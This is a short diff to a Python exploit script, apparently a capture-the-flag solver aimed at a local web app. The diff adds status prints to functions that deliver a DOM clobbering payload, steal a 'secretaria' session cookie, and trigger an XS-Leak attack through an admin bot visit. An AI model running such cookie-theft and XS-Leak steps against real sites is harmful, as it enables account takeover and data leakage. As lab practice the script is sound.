@@ -18,6 +18,7 @@ def send_cloberring_payload(payload):
     print(r.text)
 
 def attack_secretaria():
+    print("[+] Make Dom Cloberrring Note")
     r1 = c.get("http://localhost:6969/usuario/notes")
     soup = bs4.BeautifulSoup(r1.text, 'html.parser')
     links = soup.find_all("a", href=True)
@@ -31,6 +32,7 @@ def attack_secretaria():
     print("[+] Got Secretaria Cookie:", secretaria_cookie)
 
 def attack_XSLeak(url):
+    print("[+] Attack presidente note using XSleaks")
     r = c.get("http://localhost:6969/bot/visit/presidente?url="+url)
     print(r.text)
 
